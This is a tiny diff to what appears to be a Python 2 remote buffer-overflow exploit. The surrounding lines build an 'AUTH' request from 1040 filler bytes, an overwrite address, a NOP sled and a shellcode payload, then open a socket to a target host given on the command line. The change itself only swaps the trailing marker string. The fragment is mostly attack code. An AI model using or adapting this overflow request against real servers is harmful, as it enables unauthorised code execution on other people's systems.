@@ -39,7 +39,7 @@ except IndexError:
     print "[+] Usage %s host" % sys.argv[0]
     sys.exit()
 
-req1 = "AUTH " + "\x41"* (1040) + "\x71\xe8\x78\x77" + nopt*16 + payload + "HELLOFRIENDYOUGOTPWND"
+req1 = "AUTH " + "\x41"* (1040) + "\x71\xe8\x78\x77" + nopt*16 + payload + "GET..PWND..L33t"
 s = so.socket(so.AF_INET, so.SOCK_STREAM)
 try:
      s.connect((server, port))
